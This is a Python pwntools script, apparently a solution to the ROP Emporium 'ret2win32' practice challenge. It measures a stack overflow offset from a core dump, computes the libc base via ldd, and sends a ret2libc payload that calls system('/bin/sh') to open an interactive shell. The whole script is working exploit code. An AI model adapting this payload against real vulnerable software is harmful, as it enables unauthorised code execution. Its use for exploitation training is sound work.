#!/usr/bin/env python3

# ROP Emporium - ret2win32 shell solution using pwntools library
# Link: https://ropemporium.com/challenge/ret2win.html
# Created by dilldylanpickle on 4-2-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10 (https://www.python.org/downloads/release/python-3810/)
#   - Pwntools (https://github.com/Gallopsled/pwntools)

import os           # Provides a way of using operating system dependent functionalities
import subprocess   # Allows running of external commands and communication with shell or child processes
import re           # Allows pattern matching and text processing through regex
from pwn import *   # Import Python3 library for accessing operating system functionality

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)

    # Set log level to debug if debugging is needed
    context.log_level = 'debug'

    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Get the offset by calling the find_offset() function
        offset = find_offset(elf)
        log.debug(f"The offset calculated to overwrite EIP is {offset} bytes")

        # Get the libc base address
        libc_base_addr = calculate_libc(binary_path)
        log.debug(f"The base address of libc is {hex(libc_base_addr)}")

        # Get the address of the system() function
        system_addr = elf.libc.symbols["system"]
        log.debug(f"The address of system() is {hex(system_addr)}")

        # Get the address of 'bin/sh' string
        binsh = next(elf.libc.search(b'/bin/sh\x00')) 
        log.debug(f"The address of '/bin/sh' is {hex(binsh)}")       

        # Craft the payload using a ret2libc attack method
        payload = ret2libc_x86(offset, libc_base_addr, system_addr, binsh)

        # Print the payload in hexadecimal representation for debugging purposes
        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))

        # Recieve data and send payload to process
        io.clean()
        io.sendline(payload)

        # Allow the user to interact with the shell
        io.interactive()

def calculate_libc(binary_path):

    # Run the `ldd` command to get the dynamic dependencies of the binary
    try:
        ldd_output = subprocess.check_output(["ldd", binary_path]).decode()
    except Exception as e:
        raise Exception(f"Error executing ldd command: {e}")
    
    #  Search for the libc library in the dependencies and extract its base address
    match = re.search(r'libc\.so\.6 => .+ \((0x[0-9a-f]+)\)', ldd_output)
    if match:
        libc_base_address = match.group(1)

        # Return the base address of the C standard library
        return int(libc_base_address, 16)
    else:
        raise Exception(f"Error: libc not found in {binary_path}")

def ret2libc_x86(offset, libc_base_addr, system_addr, binsh):

    # Construct the payload for the ret2libc exploit
    try:
        payload = b'\x69' * offset
        payload += p32(system_addr + libc_base_addr)
        payload += p32(0x0)
        payload += p32(binsh + libc_base_addr)

        # Return the crafted payload
        return payload

    except ValueError as e:
        print(f"An error occurred when attempting ret2libc: {str(e)}")
        return None

def find_cyclic_pattern(io):

    # Generate and send a cyclic pattern as input to the binary
    pattern = cyclic(144)
    io.sendline(pattern)
    io.wait()

    # Return the core file
    return io.corefile

def find_offset(elf):

    # Save the original log level which would be either 'info' or 'debug'
    log_level = context.log_level

    # Disable logging for offset calculations
    context.log_level = 'error'

     # Record a memory crash in the Core_Dumps subdirectory
    try:

        # Create a directory called 'Core_Dumps' if it does not already exist
        if not os.path.exists('Core_Dumps'):
            os.makedirs('Core_Dumps')

        # Automatically close the process when the "with" block is exited
        with process(elf.path) as io:

            # If the architecture is x86, calculate the offset to overwrite eip
            if context.arch == 'i386':
                core = find_cyclic_pattern(io)
                offset = cyclic_find(p32(core.eip), n=4)

            # If the architecture is x86_64, calculate the offset to overwrite rip
            elif context.arch == 'amd64':
                core = find_cyclic_pattern(io)
                rip = core.rip
                offset = cyclic_find(core.read(core.rsp, 4))

            # Revert the log level to the original value
            context.log_level = log_level

        # Move all files with the pattern 'core.*' or just 'core' to the 'Core_Dumps' directory
        for filename in os.listdir('.'):
            if filename.startswith('core.') or filename == 'core':
                os.rename(filename, os.path.join('Core_Dumps', filename))


        # Output the calculated offset for debugging purposes
        log.debug(f"The offset calculated to overwrite the instruction pointer is {offset} bytes")

        # Return the calculated offset to overwrite the instruction pointer
        return offset

    except FileNotFoundError as e:
        log.error(f"Error: Binary file not found at {binary_path}")
        raise e
    except PermissionError as e:
        log.error(f"Error: You do not have permission to access {binary_path}")
        raise e
    except ValueError as e:
        log.error(f"Error: Unable to find cyclic pattern in core dump")
        raise e
    except Exception as e:
        log.error(f"Error: An unexpected error occurred while finding the offset")
        raise e

if __name__ == '__main__':

    # Initiate the executables name to declare a valid filesystem path
    binary_path = './ret2win32'
    warnings.filterwarnings("ignore", category=BytesWarning)

    # Perform the exploitation on the specified binary
    exploit(binary_path)
